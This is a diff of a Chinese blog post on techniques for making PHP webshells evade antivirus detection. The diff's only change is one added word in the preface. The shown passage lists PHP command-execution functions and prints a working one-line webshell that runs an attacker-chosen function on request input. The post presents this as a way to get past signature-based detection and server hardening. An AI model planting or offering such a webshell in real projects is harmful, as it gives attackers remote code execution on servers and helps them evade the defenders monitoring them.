@@ -159,7 +159,7 @@
         
 
         <!-- Post Content -->
-        <p><br><br>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;几乎是涵盖了市面上所有已知的webshell免杀手段,自己也很清楚,有些东西一旦公布出去,基本就活不太久了,但技巧是死的,人是活的,基于前人的优秀经验基础上所衍生出来的更加刁钻诡异的思路才是最珍贵的,始终坚信,对抗是持续的,shell也是永远杀不完的…<br><br><br>0x01 基于各类常规命令和代码执行函数的花样变形<code>如,拆分重组,动态执行,以此来躲避静态特征检测</code>,不过像有些高危函数默认就会被运维们禁掉,甚至高版本的php默认已经不让执行系统命令[如,php7],万一再开了安全模式,就更费劲了</p>
+        <p><br><br>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;本文几乎是涵盖了市面上所有已知的webshell免杀手段,自己也很清楚,有些东西一旦公布出去,基本就活不太久了,但技巧是死的,人是活的,基于前人的优秀经验基础上所衍生出来的更加刁钻诡异的思路才是最珍贵的,始终坚信,对抗是持续的,shell也是永远杀不完的…<br><br><br>0x01 基于各类常规命令和代码执行函数的花样变形<code>如,拆分重组,动态执行,以此来躲避静态特征检测</code>,不过像有些高危函数默认就会被运维们禁掉,甚至高版本的php默认已经不让执行系统命令[如,php7],万一再开了安全模式,就更费劲了</p>
 <p>php中一些常见的执行类型函数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">system()</div><div class="line">exec()</div><div class="line">shell_exec()</div><div class="line">passthru()</div><div class="line">proc_open()</div><div class="line"><span class="string">``</span> 反引号执行系统命令</div><div class="line">...</div></pre></td></tr></table></figure></p>
 <figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_POST[<span class="string">'fun'</span>]($_REQUEST[<span class="string">'req'</span>]);?&gt;</div></pre></td></tr></table></figure>
 <a id="more"></a>
